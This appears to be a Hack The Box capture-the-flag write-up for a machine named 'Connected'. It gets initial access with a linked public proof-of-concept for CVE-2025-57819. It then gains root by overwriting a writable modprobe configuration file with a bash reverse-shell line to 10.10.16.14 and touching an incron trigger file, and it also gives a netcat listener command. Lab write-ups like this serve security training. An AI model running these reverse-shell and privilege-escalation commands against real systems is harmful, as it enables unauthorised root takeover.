# Connected-HTB

Port 80 shows this website:
<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/f6b63442-4ec9-4ef1-a13a-4ab5dd61ad5f" />

At the bottom of the page we can see that there is a version number for Free at the bottom of the page, so let's try to find some CVE's for it:
<img width="832" height="159" alt="image" src="https://github.com/user-attachments/assets/02504d48-c947-4d99-b192-9fbd59d9dbf0" />

If we google it we can find a PoC for it: https://github.com/b4sh2/CVE-2025-57819-poc download it.

Set up the listener:
<img width="467" height="161" alt="image" src="https://github.com/user-attachments/assets/a0a9ace6-120d-41c2-b199-b97e1d4559e5" />

Execute the PoC:
<img width="764" height="247" alt="image" src="https://github.com/user-attachments/assets/fd3216e0-8d8b-4898-a30e-4f4b370248e6" />

And get shell:
<img width="778" height="124" alt="image" src="https://github.com/user-attachments/assets/df9080a4-1d0d-4a0b-86b4-37ada2e70eb0" />

Now for privesc, we must look at the contents of /etc/incron.d/legacy
```bash
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```
DAHDI (Digium/Asterisk Hardware Device Interface) is the Linux subsystem used by Asterisk to interact with telephony hardware and timing resources, and in many cases it requires root for running, it's worth exploring.
Now let's read this file here: /usr/sbin/sysadmin_dahdi_restart
```bash
cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

Now let's keep following the trail inspect: /etc/init.d/asterisk
<img width="779" height="403" alt="image" src="https://github.com/user-attachments/assets/4cb56641-6db2-44b8-91c3-13966379e524" />

Now: cat /etc/dahdi/init.conf
<img width="687" height="403" alt="Captura de tela 2026-06-08 234042" src="https://github.com/user-attachments/assets/85e63da5-8adc-44dd-9930-428806a1cc3b" />

Now let's check modprobe.d
```bash
[asterisk@connected sysadmin]$ ls -la /etc/modprobe.d
ls -la /etc/modprobe.d
total 52
drwxr-xr-x.   2 root     root      253 Jun  2 13:39 .
drwxr-xr-x. 119 root     root     8192 Jun  8 19:00 ..
-rw-r--r--.   1 root     root       29 Nov 30  2025 audio_blacklist.conf
-rw-r--r--.   1 root     root       29 Jun  6  2023 audio-blacklist.conf
-rw-r--r--.   1 root     root      819 Jun  5  2023 dahdi-blacklist.conf
-rw-r--r--.   1 asterisk asterisk  114 Jun  5  2023 dahdi.conf
-rw-r--r--.   1 root     root      215 Aug 25  2020 dccp-blacklist.conf
-rw-r--r--    1 root     root       73 May 21 08:29 dirtyfrag.conf
-rw-r--r--    1 root     root       30 Jun  2 13:39 disable-algif.conf
-rw-r--r--.   1 root     root      166 Apr  7  2020 firewalld-sysctls.conf
-rw-r--r--.   1 root     root      674 Mar 21  2019 tuned.conf
-rw-r--r--.   1 root     root       55 Jun  6  2023 xt_recent.conf
```
Bingo, we can rewrite daddi.conf into a malicious file then trigger the incron with touck and this shoul return us shell. First set up a listener at your machine:
```bash
nc -lnvp 6666
```
The eceute shit command:
```bash
echo "install dahdi /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.14/6666 0>&1'" > /etc/modprobe.d/dahdi.conf

touch /var/spool/asterisk/sysadmin/dahdi_restart
```
And get root:
<img width="747" height="725" alt="image" src="https://github.com/user-attachments/assets/538eb842-a9b2-47f7-9744-9aa1acab291b" />






